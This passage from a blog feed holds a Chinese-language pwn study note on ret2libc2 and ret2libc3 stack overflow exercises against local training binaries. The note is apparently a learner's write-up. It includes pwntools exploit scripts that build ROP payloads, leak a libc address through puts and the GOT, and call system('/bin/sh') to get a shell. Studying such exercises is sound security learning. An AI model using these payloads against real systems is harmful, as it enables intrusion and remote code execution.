title=\"后记\"></a>后记</h3><p>​\t\t\t函数末尾处的代码,用于恢复栈和寄存器到函数调用之前的状态. IA-32(32位x86)体系结构中,后记内设指令是leave,具体内容是下面三条指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movl %ebp, %esp //把ebp的值赋值给esp,释放掉开辟的栈空间</span><br><span class=\"line\">popl %ebp  //让ebp指回调用者函数的栈帧</span><br><span class=\"line\">ret        //返回  ret包含了两条指令,pop 和 jump(参上)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230220103140222.png\" alt=\"image-20230220103140222\"></p>\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><p>​\t\t示例程序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">foo</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> a;</span><br><span class=\"line\">        a = x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">bar</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> b=<span class=\"number\">5</span>;</span><br><span class=\"line\">        foo(b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tgcc -m32 -S prog.c 编译成汇编代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo:</span><br><span class=\"line\">\tpushl\t%ebp</span><br><span class=\"line\">\tmovl\t%esp, %ebp</span><br><span class=\"line\">\tsubl\t$16, %esp</span><br><span class=\"line\">\tmovl\t8(%ebp), %eax</span><br><span class=\"line\">\tmovl\t%eax, -4(%ebp)</span><br><span class=\"line\">\tleave</span><br><span class=\"line\">\tret</span><br><span class=\"line\">bar:</span><br><span class=\"line\">\tpushl\t%ebp</span><br><span class=\"line\">\tmovl\t%esp, %ebp</span><br><span class=\"line\">\tsubl\t$16, %esp</span><br><span class=\"line\">\tmovl\t$5, -4(%ebp)</span><br><span class=\"line\">\tpushl\t-4(%ebp)                   // 这一句是干什么的?????? 这一句和上一句组合,压入参数</span><br><span class=\"line\">\tcall\tfoo</span><br><span class=\"line\">\taddl\t$4, %esp</span><br><span class=\"line\">\tleave</span><br><span class=\"line\">\tret</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">foo</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> a;</span><br><span class=\"line\">        a = x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">bar</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> b=<span class=\"number\">5</span>;</span><br><span class=\"line\">        foo(b);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  bar();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>关于参数等再怎么具体的,要看看编译原理? 之类的?</p>\n<h2 id=\"ret2libc2\"><a href=\"#ret2libc2\" class=\"headerlink\" title=\"ret2libc2\"></a>ret2libc2</h2><p>​\t\t相比ret2libc1,ret2libc2里没有&#x2F;bin&#x2F;sh,需要我们自己从其他渠道获取</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">08048490</span> &lt;system@plt&gt;:</span><br><span class=\"line\"><span class=\"number\">8048641</span>:\te8 <span class=\"number\">4</span>a fe ff ff       \tcall   <span class=\"number\">8048490</span> &lt;system@plt&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">08048460</span> &lt;gets@plt&gt;:</span><br><span class=\"line\"><span class=\"number\">80486b</span>a:\te8 a1 fd ff ff       \tcall   <span class=\"number\">8048460</span> &lt;gets@plt&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0x0804872f</span> : pop ebp ; ret</span><br><span class=\"line\"><span class=\"number\">0x0804872c</span> : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\"><span class=\"number\">0x0804843d</span> : pop ebx ; ret</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t因为ret2libc2里有gets函数,所以可以先利用这个,读取一个&#x2F;bin&#x2F;sh,写入到哪呢? 写入到bss段,为什么写入到bss段呢?bss段的地址又怎么选呢???????</p>\n<p>​\t\t写入进去后再从这里读取就可以了!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:0804A03F</span><br><span class=\"line\">.bss:0804A040 ; ===========================================================================</span><br><span class=\"line\">.bss:0804A040</span><br><span class=\"line\">.bss:0804A040 ; Segment type: Uninitialized</span><br><span class=\"line\">.bss:0804A040 ; Segment permissions: Read/Write</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以payload的构造</p>\n<p>​\t\tpayload &#x3D; b”a”*112 + gets + popret + buf + system + exit + buf</p>\n<p>​\t\tpayload &#x3D; b”a”*112 + gets + system + buf + buf</p>\n<p>​\t\t在gets的后面要跟一个pop xxx; ret 为什么呢? 因为这里本身是返回地址,在gets执行完后,要想继续执行的话,需要把后面的buf给弹出来,然后再ret,把system当成返回地址? 不知道这么理解对不对,可以调试一下看看</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh  = process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gets = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">system = <span class=\"number\">0x08048490</span></span><br><span class=\"line\">buf = <span class=\"number\">0x0804A040</span></span><br><span class=\"line\">popret = <span class=\"number\">0x0804843d</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span> + p32(gets) + p32(popret) + p32(buf) + p32(system) + p32(<span class=\"number\">0</span>) + p32(buf)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t感觉能行,但是有点小问题,,还有那这个payload是不是也可以呢?payload &#x3D; b”a”*112 + p32(gets) + p32(system) + p32(buf) + p32(buf),如果按照上面的逻辑的话,是的,这个payload没问题! <font color=\"red\">所以,究其根本我们是伪造了函数执行过程,只要符合它这个流程,理解本质,根据具体情况构造就可以了!!</font></p>\n<p>​\t\t(不过为什么执行一条命令就EOF了?) 那是因为 system需要获取&#x2F;bin&#x2F;sh…你忘了,直接输入 id  whoami什么的,肯定就一次,可以直接输入&#x2F;bin&#x2F;sh,也可以在exp里面在加一行 sh.send(b”&#x2F;bin&#x2F;sh”)</p>\n<p>​\t\t<font color=\"red\">不行,send不行,要两个sendline才可以,send和sendline肯定有区别,回头写pwntools时(pwn入门-6)看一下</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh  = process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gets = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">system = <span class=\"number\">0x08048490</span></span><br><span class=\"line\">buf = <span class=\"number\">0x0804A040</span></span><br><span class=\"line\">popret = <span class=\"number\">0x0804872f</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span> + p32(gets) + p32(system) + p32(buf) + p32(buf)</span><br><span class=\"line\"><span class=\"comment\">#payload = b&quot;a&quot;*112 + p32(gets) + p32(popret) + p32(buf) + p32(system) + p32(0) + p32(buf)</span></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&quot;/bin/sh&quot;</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"ret2libc3\"><a href=\"#ret2libc3\" class=\"headerlink\" title=\"ret2libc3\"></a>ret2libc3</h2><p>​\t\t相比ret2libc2,system也没了,那就需要从libc中找了,libc的话没有给你版本,就需要泄露个函数地址,然后去找版本,泄漏的话,用puts输出.</p>\n<p>​\t\t是不是需要先换个libc版本呢???? 还是什么????????????????????&#x2F;不对呀,既然需要泄漏函数..那libc版本就是固定的了,为什么呢….是动态链接的事?</p>\n<p>​\t\t先打印出libc_start_main_addr 再说</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> Libcsearcher <span class=\"keyword\">import</span> Libcsearcher</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2libc3&quot;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&quot;./ret2libc3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = ret2libc3.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = ret2libc3.plt[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span> + puts_plt + main + libc_start_main_got</span><br><span class=\"line\">sh.sendafter(<span class=\"string\">&quot;Can you find it !?&quot;</span>,payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_start_main_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(libc_start_main_addr)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t很奇怪,这个脚本感觉没什么问题,但是不行,下面的却可以…….感觉没有什么区别呀………..</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = ret2libc3.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = ret2libc3.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = flat([<span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;get the related addr&quot;</span>)</span><br><span class=\"line\">libc_start_main_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_start_main_addr))</span><br></pre></td></tr></table></figure>\n\n<p>sh.sendlineafter(‘Can you find it !?’, payload) </p>\n<p>sh.sendafter(“Can you find it !?”,payload1)</p>\n<p>区别在这里!!!!!</p>\n<p>还有如果不加[0:4]会是怎样?</p>\n<p>print(sh.recv())看看</p>\n<p>b’\\xb0\\xde\\xdf\\xf7\\nNo surprise anymore, system disappeard QQ.\\nCan you find it !?’</p>\n<p>所以是要前四个字节的意思! </p>\n<p>​\t\tlibc的问题参见下面,目前就当已经解决libc的问题了,然后继续做,libcbase的话就是这个&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 (0xf7de5000),</p>\n<p>​\t\t然后就是获取binsh和system的地址,这个可以直接用objdump或者ROPgadget</p>\n<p>​\t\tobjdump -d &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 | grep “system”</p>\n<p>​\t\tROPgadget –binary &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 –string ‘&#x2F;bin&#x2F;sh’</p>\n<p>​\t\t其实泄露了地址,找到了gadget,就是最开始最简单的那个溢出了,</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2libc3&quot;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&quot;./ret2libc3&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = ret2libc3.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">puts_got = ret2libc3.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">main = ret2libc3.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system_addr = libcbase + libc.dump(&quot;system&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#binsh_addr = libcbase + libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class=\"line\">system_addr = <span class=\"number\">0xf7de5000</span> + <span class=\"number\">0x0003d3d0</span></span><br><span class=\"line\">binsh_addr =  <span class=\"number\">0xf7de5000</span> + <span class=\"number\">0x0017e1db</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, system_addr, <span class=\"number\">0xdeadbeef</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t虽然这里没有成功,但还是看看exp,理解一下这个思路. 接收到泄露的地址后,用libcsearcher搜索一下,搜索到了之后,用libc_start_main_addr(这个就是虚拟地址) 减去 __libc_start_main的地址(在文件中的偏移),于是就得到了加载libc的基地址,就是这玩意\tlibc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 (0xf7de5000),然后再从libc里面搜索要用的函数或者字符串,加上加载的基地址就可以了.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc_start_main_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class=\"line\">libcbase = libc_start_main_addr - libc.dump(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr = libcbase + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;get shell&quot;</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">104</span>, system_addr, <span class=\"number\">0xdeadbeef</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"关于libc的问题\"><a href=\"#关于libc的问题\" class=\"headerlink\" title=\"关于libc的问题\"></a>关于libc的问题</h3><p>​\t\t首先,之所以要泄露libc的版本是因为,我们要打一个远程的机器,要利用到它的libc库里的函数,但是不同版本的libc的函数位置等是不一样的,<font color=\"red\">所以需要泄露远程机器的libc版本</font>,然后本地patch进行调试,再打远程.</p>\n<p>​\t\t像很多博客中的例题,是没有远程环境的,所以就自己利用自己本地的环境,链接到自己本地的libc上,不过问题是,有时候libcsearch搜索自己本地的libc搜不出来,版本是错的,目前我也不知道为什么….当然这些工具本身就不是完美的.</p>\n<p>​\t\t这种题的话,如果出现上面的问题,可以就略过搜索libc的环节,直接用本地的就好了.</p>\n<p>​\t\t查看本地libc版本</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># ldd --version</span></span><br><span class=\"line\">ldd (Ubuntu GLIBC <span class=\"number\">2.27</span><span class=\"number\">-3u</span>buntu1<span class=\"number\">.4</span>) <span class=\"number\">2.27</span></span><br><span class=\"line\">Copyright (C) <span class=\"number\">2018</span> Free Software Foundation, Inc.</span><br><span class=\"line\">This is <span class=\"built_in\">free</span> software; see the source <span class=\"keyword\">for</span> copying conditions.  There is NO</span><br><span class=\"line\">warranty; not even <span class=\"keyword\">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class=\"line\">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t一般来说都是链接到这个默认的,可以用ldd查看一下,然后直接执行这个文件也可以看到版本</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># ldd ret2libc3</span></span><br><span class=\"line\">\tlinux-gate.so<span class=\"number\">.1</span> (<span class=\"number\">0xf7fd5000</span>)</span><br><span class=\"line\">\tlibc.so<span class=\"number\">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class=\"number\">.6</span> (<span class=\"number\">0xf7de5000</span>)</span><br><span class=\"line\">\t/lib/ld-linux.so<span class=\"number\">.2</span> (<span class=\"number\">0xf7fd6000</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"># /lib/i386-linux-gnu/libc.so<span class=\"number\">.6</span> --version</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC <span class=\"number\">2.27</span><span class=\"number\">-3u</span>buntu1<span class=\"number\">.6</span>) stable release version <span class=\"number\">2.27</span>.</span><br><span class=\"line\">Copyright (C) <span class=\"number\">2018</span> Free Software Foundation, Inc.</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t获取libc版本的话可以有很多方式,可以到libc database网站上查,也可以用libcsearch这个库,<font color=\"red\">但不一定百分百准确,</font></p>\n<p>​\t\t比如上面获取了libc_start_main_addr的地址后,就可以去网站上查 <a href=\"https://libc.blukat.me/\">https://libc.blukat.me</a></p>\n<p>​\t\t但是确实不准……..</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230221212120145.png\" alt=\"image-20230221212120145\"></p>\n<p>​\t\t或者用libcsearch,在上面的代码基础上再加2行</p>\n<p>​\t\tlibc &#x3D; LibcSearcher(‘__libc_start_main’, libc_start_main_addr)</p>\n<p>​\t\tlibcbase &#x3D; libc_start_main_addr - libc.dump(‘__libc_start_main’)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[+] There are multiple libc that meet current constraints :</span><br><span class=\"line\"><span class=\"number\">0</span> - libc<span class=\"number\">-2.30</span><span class=\"number\">-13.f</span>c31.i686</span><br><span class=\"line\"><span class=\"number\">1</span> - libc<span class=\"number\">-2.30</span><span class=\"number\">-2</span>-x86</span><br><span class=\"line\"><span class=\"number\">2</span> - libc<span class=\"number\">-2.30</span><span class=\"number\">-3</span>-x86</span><br><span class=\"line\"><span class=\"number\">3</span> - libc<span class=\"number\">-2.30</span><span class=\"number\">-1</span>-x86</span><br><span class=\"line\"><span class=\"number\">4</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-16.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">5</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-17.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">6</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-20.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">7</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-21.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">8</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-18.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">9</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-19.</span>mga8.x86_64_2</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t咱也不知道为啥..就是不对,,可能数据库汇总没收录??不对呀,这就是很常见的2.27..</p>\n<h1 id=\"残留疑问\"><a href=\"#残留疑问\" class=\"headerlink\" title=\"残留疑问\"></a>残留疑问</h1><p>输入到bss段中的&#x2F;bin&#x2F;sh有什么要求呢?哪里都可以输入吗?为什么输入到bss段?</p>\n<p>好像是pip和github下载的libcsearch有区别</p>\n<p>这个查的不准可以去别的地方查,把libc_start_main_addr打印出来后,去一些网址上查可以</p>\n<p><a href=\"https://www.jianshu.com/p/5525dde00053\">https://www.jianshu.com/p/5525dde00053</a></p>\n<p>为什么nm和exp里的输出不一样,是因为一个是静态,一个是动态加载后的吗</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230221224958263.png\" alt=\"image-20230221224958263\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230221225004604.png\" alt=\"image-20230221225004604\"></p>\n<p>__libc_start_main 通过这个得到libc?</p>\n<p><a href=\"https://blog.csdn.net/weixin_45309916/article/details/119481681\">https://blog.csdn.net/weixin_45309916/article/details/119481681</a></p>\n<p>​\t</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/",
            "title": "pwn入门-8-os保护机制canary",
            "date_published": "2023-02-18T03:05:31.000Z",
